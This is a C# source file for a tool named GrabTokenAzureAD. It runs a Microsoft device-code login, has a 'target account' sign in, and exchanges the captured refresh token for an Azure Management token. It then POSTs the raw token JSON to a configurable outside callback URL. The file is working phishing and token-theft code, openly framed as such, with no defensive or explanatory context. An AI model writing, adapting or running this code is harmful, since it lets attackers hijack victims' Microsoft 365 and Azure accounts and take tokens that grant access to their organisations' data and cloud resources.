using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

namespace GrabTokenAzureAD
{
    public class DeviceCodeGrabber : IDisposable
    {
        private readonly GrabberConfig _config;

        public event EventHandler<string> OnStatus;
        public event EventHandler<TokenResult> OnTokenCaptured;

        public DeviceCodeGrabber(GrabberConfig config = null)
        {
            _config = config ?? new GrabberConfig();
        }

        public GrabResult GrabTokens()
        {
            return GrabTokens(CancellationToken.None);
        }

        public GrabResult GrabTokens(CancellationToken cancellationToken)
        {
            var result = new GrabResult();

            try
            {
                RaiseStatus("Requesting device code...");
                var deviceCode = RequestDeviceCode(_config.GraphScope);

                if (deviceCode == null || string.IsNullOrEmpty(deviceCode.DeviceCode))
                {
                    result.Error = "Failed to get device code";
                    SendError(result.Error);
                    return result;
                }

                Console.WriteLine();
                Console.WriteLine("╔════════════════════════════════════════════════════════════╗");
                Console.WriteLine("║              DEVICE CODE AUTHENTICATION                    ║");
                Console.WriteLine("╠════════════════════════════════════════════════════════════╣");
                Console.WriteLine("║                                                            ║");
                Console.WriteLine("║  1. Open: https://microsoft.com/devicelogin                ║");
                Console.WriteLine("║                                                            ║");
                Console.WriteLine($"║  2. Enter code: {deviceCode.UserCode,-10}                         ║");
                Console.WriteLine("║                                                            ║");
                Console.WriteLine("║  3. Sign in with target account                            ║");
                Console.WriteLine("║                                                            ║");
                Console.WriteLine("╚════════════════════════════════════════════════════════════╝");
                Console.WriteLine();

                RaiseStatus($"Waiting for authentication (timeout: {deviceCode.ExpiresIn}s)...");

                string graphJson = PollForToken(deviceCode, _config.GraphScope, cancellationToken);
                if (string.IsNullOrEmpty(graphJson))
                {
                    result.Error = "Authentication timed out or was cancelled";
                    SendError(result.Error);
                    return result;
                }

                result.GraphToken = TokenResult.FromJson(graphJson);
                result.GraphToken.Resource = "https://graph.microsoft.com";

                if (result.GraphToken.IsSuccess)
                {
                    RaiseStatus("Graph token obtained!");
                    OnTokenCaptured?.Invoke(this, result.GraphToken);
                    SendToCallback("graph", graphJson);

                    if (!string.IsNullOrEmpty(result.GraphToken.RefreshToken))
                    {
                        RaiseStatus("Exchanging for Management token...");
                        string mgmtJson = ExchangeRefreshToken(result.GraphToken.RefreshToken, _config.ManagementScope);
                        result.ManagementToken = TokenResult.FromJson(mgmtJson);
                        result.ManagementToken.Resource = "https://management.azure.com";

                        if (result.ManagementToken.IsSuccess)
                        {
                            RaiseStatus("Management token obtained!");
                            OnTokenCaptured?.Invoke(this, result.ManagementToken);
                            SendToCallback("management", mgmtJson);
                        }
                        else
                        {
                            SendError("Management token exchange failed: " + result.ManagementToken.Error);
                        }
                    }
                }
                else
                {
                    result.Error = result.GraphToken.ErrorDescription ?? result.GraphToken.Error;
                    SendError("Graph token failed: " + result.Error);
                }
            }
            catch (OperationCanceledException)
            {
                result.Error = "Operation cancelled";
                SendError(result.Error);
            }
            catch (Exception ex)
            {
                result.Error = ex.Message;
                RaiseStatus($"Error: {ex.Message}");
                SendError(ex.Message);
            }

            return result;
        }

        private DeviceCodeResponse RequestDeviceCode(string scope)
        {
            try
            {
                string url = $"{_config.Authority}/devicecode";
                string body = $"client_id={Uri.EscapeDataString(_config.ClientId)}&scope={Uri.EscapeDataString(scope)}";

                var request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "POST";
                request.ContentType = "application/x-www-form-urlencoded";
                request.Timeout = 30000;

                byte[] data = Encoding.UTF8.GetBytes(body);
                request.ContentLength = data.Length;

                using (var stream = request.GetRequestStream())
                {
                    stream.Write(data, 0, data.Length);
                }

                using (var response = (HttpWebResponse)request.GetResponse())
                using (var reader = new StreamReader(response.GetResponseStream()))
                {
                    string json = reader.ReadToEnd();
                    return DeviceCodeResponse.FromJson(json);
                }
            }
            catch (Exception ex)
            {
                RaiseStatus($"Device code request failed: {ex.Message}");
                return null;
            }
        }

        private string PollForToken(DeviceCodeResponse deviceCode, string scope, CancellationToken cancellationToken)
        {
            string url = $"{_config.Authority}/token";
            string body = $"grant_type=urn:ietf:params:oauth:grant-type:device_code" +
                         $"&client_id={Uri.EscapeDataString(_config.ClientId)}" +
                         $"&device_code={Uri.EscapeDataString(deviceCode.DeviceCode)}";

            DateTime expiry = DateTime.UtcNow.AddSeconds(deviceCode.ExpiresIn);
            int interval = Math.Max(deviceCode.Interval, 5) * 1000;

            while (DateTime.UtcNow < expiry)
            {
                if (cancellationToken.IsCancellationRequested)
                    return null;

                Thread.Sleep(interval);

                try
                {
                    var request = (HttpWebRequest)WebRequest.Create(url);
                    request.Method = "POST";
                    request.ContentType = "application/x-www-form-urlencoded";
                    request.Timeout = 30000;

                    byte[] data = Encoding.UTF8.GetBytes(body);
                    request.ContentLength = data.Length;

                    using (var stream = request.GetRequestStream())
                    {
                        stream.Write(data, 0, data.Length);
                    }

                    using (var response = (HttpWebResponse)request.GetResponse())
                    using (var reader = new StreamReader(response.GetResponseStream()))
                    {
                        return reader.ReadToEnd();
                    }
                }
                catch (WebException wex)
                {
                    if (wex.Response is HttpWebResponse errorResponse)
                    {
                        using (var reader = new StreamReader(errorResponse.GetResponseStream()))
                        {
                            string errorJson = reader.ReadToEnd();
                            var errorDict = SimpleJsonParser.Parse(errorJson);

                            if (errorDict.TryGetValue("error", out string error))
                            {
                                if (error == "authorization_pending")
                                {
                                    continue;
                                }
                                else if (error == "slow_down")
                                {
                                    interval += 5000;
                                    continue;
                                }
                                else if (error == "expired_token")
                                {
                                    RaiseStatus("Device code expired");
                                    return null;
                                }
                                else if (error == "authorization_declined")
                                {
                                    RaiseStatus("User declined authorization");
                                    return null;
                                }
                            }
                        }
                    }
                }
            }

            return null;
        }

        private string ExchangeRefreshToken(string refreshToken, string scope)
        {
            string url = $"{_config.Authority}/token";
            string body = $"grant_type=refresh_token" +
                         $"&client_id={Uri.EscapeDataString(_config.ClientId)}" +
                         $"&refresh_token={Uri.EscapeDataString(refreshToken)}" +
                         $"&scope={Uri.EscapeDataString(scope)}";

            var request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            request.Timeout = 30000;

            byte[] data = Encoding.UTF8.GetBytes(body);
            request.ContentLength = data.Length;

            using (var stream = request.GetRequestStream())
            {
                stream.Write(data, 0, data.Length);
            }

            try
            {
                using (var response = (HttpWebResponse)request.GetResponse())
                using (var reader = new StreamReader(response.GetResponseStream()))
                {
                    return reader.ReadToEnd();
                }
            }
            catch (WebException wex)
            {
                if (wex.Response is HttpWebResponse errorResponse)
                {
                    using (var reader = new StreamReader(errorResponse.GetResponseStream()))
                    {
                        return reader.ReadToEnd();
                    }
                }
                throw;
            }
        }

        private void SendToCallback(string label, string tokenJson)
        {
            if (string.IsNullOrEmpty(_config.CallbackUrl)) return;

            try
            {
                string payload = $"{{\"label\":\"{label}\",\"token\":{tokenJson}}}";
                byte[] data = Encoding.UTF8.GetBytes(payload);

                using (var wc = new WebClient())
                {
                    wc.Headers[HttpRequestHeader.ContentType] = "application/json";
                    wc.UploadData(_config.CallbackUrl, "POST", data);
                }
                RaiseStatus($"Sent {label} token to callback");
            }
            catch (Exception ex)
            {
                RaiseStatus($"Callback failed for {label}: {ex.Message}");
            }
        }

        private void SendError(string error)
        {
            if (string.IsNullOrEmpty(_config.CallbackUrl)) return;

            try
            {
                string payload = $"{{\"error\":\"{EscapeJson(error)}\"}}";
                byte[] data = Encoding.UTF8.GetBytes(payload);

                using (var wc = new WebClient())
                {
                    wc.Headers[HttpRequestHeader.ContentType] = "application/json";
                    wc.UploadData(_config.CallbackUrl, "POST", data);
                }
            }
            catch { }
        }

        private static string EscapeJson(string s)
        {
            if (string.IsNullOrEmpty(s)) return s;
            return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "\\r");
        }

        private void RaiseStatus(string message)
        {
            OnStatus?.Invoke(this, message);
        }

        public void Dispose()
        {
        }
    }

    public class DeviceCodeResponse
    {
        public string DeviceCode { get; set; }
        public string UserCode { get; set; }
        public string VerificationUri { get; set; }
        public int ExpiresIn { get; set; }
        public int Interval { get; set; }
        public string Message { get; set; }

        public static DeviceCodeResponse FromJson(string json)
        {
            var dict = SimpleJsonParser.Parse(json);
            var result = new DeviceCodeResponse();

            if (dict.TryGetValue("device_code", out string deviceCode))
                result.DeviceCode = deviceCode;
            if (dict.TryGetValue("user_code", out string userCode))
                result.UserCode = userCode;
            if (dict.TryGetValue("verification_uri", out string verificationUri))
                result.VerificationUri = verificationUri;
            if (dict.TryGetValue("expires_in", out string expiresIn) && int.TryParse(expiresIn, out int exp))
                result.ExpiresIn = exp;
            if (dict.TryGetValue("interval", out string interval) && int.TryParse(interval, out int intv))
                result.Interval = intv;
            if (dict.TryGetValue("message", out string message))
                result.Message = message;

            return result;
        }
    }
}
